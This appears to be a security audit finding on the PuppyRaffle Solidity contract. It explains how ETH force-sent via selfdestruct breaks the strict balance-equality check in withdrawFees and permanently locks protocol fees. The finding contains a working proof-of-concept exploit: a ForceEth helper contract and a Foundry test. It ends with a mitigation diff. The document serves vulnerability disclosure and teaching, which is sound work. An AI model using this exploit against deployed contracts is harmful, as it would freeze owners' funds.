Title: Forced ETH can permanently break the strict balance check in `withdrawFees`
Impact: Medium
Likelihood: Medium
Scope: `src/PuppyRaffle.sol`

# Root + Impact

## Description

The owner should be able to withdraw accrued protocol fees after a raffle round has ended and there are no active player funds in the contract.

`withdrawFees` requires the contract's full ETH balance to equal `totalFees`. This assumes the contract balance can only change through the raffle's own accounting. However, ETH can be force-sent to a contract, for example via `selfdestruct`. Once extra ETH is forced into the raffle, `address(this).balance` becomes greater than `totalFees`, and `withdrawFees` reverts forever.

```solidity
function withdrawFees() external {
    // @> Any forced ETH breaks this equality even when only fees should remain.
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Risk

**Likelihood**:

* Any external account can deploy a helper contract and force ETH into `PuppyRaffle`.

* `withdrawFees` depends on exact equality with `address(this).balance`, which can be changed outside the contract's accounting.

**Impact**:

* Protocol fees become permanently unwithdrawable.

* The fee accounting invariant can be broken without entering the raffle or interacting with normal raffle functions.

## Proof of Concept

```solidity
contract ForceEth {
    constructor() payable {}

    function forceSend(address target) external {
        selfdestruct(payable(target));
    }
}

function testForcedEthLocksWithdrawFees() public {
    address[] memory players = new address[](4);
    players[0] = address(1);
    players[1] = address(2);
    players[2] = address(3);
    players[3] = address(4);
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();

    assertEq(address(puppyRaffle).balance, puppyRaffle.totalFees());

    ForceEth forceEth = new ForceEth{value: 1 wei}();
    forceEth.forceSend(address(puppyRaffle));

    assertGt(address(puppyRaffle).balance, puppyRaffle.totalFees());

    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```

The attacker does not need to call any payable function on `PuppyRaffle`; they only force an extra wei into the contract and break the strict equality check.

## Recommended Mitigation

Do not use exact contract balance equality to determine whether fees can be withdrawn. Track active raffle funds separately, or allow withdrawing the recorded `totalFees` when the raffle has no active paid entries.

```diff
 function withdrawFees() external {
-    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+    require(players.length == 0, "PuppyRaffle: There are currently players active!");
     uint256 feesToWithdraw = totalFees;
     totalFees = 0;
     (bool success,) = feeAddress.call{value: feesToWithdraw}("");
     require(success, "PuppyRaffle: Failed to withdraw fees");
 }
```
